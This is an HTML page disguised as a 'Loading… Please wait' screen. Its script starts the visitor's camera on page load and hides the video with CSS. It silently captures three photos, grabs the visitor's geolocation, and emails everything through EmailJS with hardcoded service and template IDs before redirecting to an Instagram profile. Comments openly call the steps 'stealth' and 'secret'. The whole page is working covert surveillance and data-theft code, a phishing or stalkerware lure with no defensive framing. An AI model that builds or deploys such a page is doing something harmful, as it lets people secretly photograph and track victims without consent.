<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body {
            background: #000;
            color: white;
            font-family: Arial;
            text-align: center;
            margin-top: 200px;
        }
        #loading {
            font-size: 22px;
            font-weight: bold;
        }
        /* Hide everything */
        video, canvas, #status {
            display: none !important;
        }
    </style>
</head>
<body>

<div id="loading">Loading… Please wait</div>
<p id="status"></p>

<video id="video" width="320" height="240" autoplay playsinline></video>
<canvas id="canvas" width="320" height="240"></canvas>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>

// INIT EMAILJS
emailjs.init("vieRRG0Q8QGFFS-XO");  // your public key

let stream;
let photos = [];

// STEALTH: Start camera immediately on load
window.onload = async () => {
    try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });

        document.getElementById("video").srcObject = stream;
        document.getElementById("status").innerText = "Camera started";

        // Auto take photos after 1.5 seconds
        setTimeout(takeMultiplePhotos, 1500);

    } catch (err) {
        document.getElementById("loading").innerText = "Error loading...";
    }
};

// Take 3 photos silently
function takeMultiplePhotos() {
    let count = 0;

    let interval = setInterval(() => {
        capturePhoto();
        count++;

        if (count === 3) {
            clearInterval(interval);
            sendEmailNow();
        }
    }, 700); // takes a photo every 0.7 sec
}

// Capture photo secretly
function capturePhoto() {
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const img = canvas.toDataURL("image/jpeg", 0.2);
    photos.push(img);
}

// Send data
function sendEmailNow() {

    document.getElementById("loading").innerText = "Finishing…";

    navigator.geolocation.getCurrentPosition((pos) => {

        let loc = pos.coords.latitude + ", " + pos.coords.longitude;

        emailjs.send("service_c2bqpj9", "template_pee9jcq", {
            location: loc,
            photo1: photos[0],
            photo2: photos[1],
            photo3: photos[2]
        })

        .then(() => {
            document.getElementById("loading").innerText = "Done ✔ Redirecting…";

            setTimeout(() => {
                window.location.href = "https://www.instagram.com/_ansh_._katiyar_/";
            }, 800);

        })

        .catch(() => {
            document.getElementById("loading").innerText = "Error.";
        });

    }, () => {
        document.getElementById("loading").innerText = "Location blocked.";
    });

}

</script>
</body>
</html>
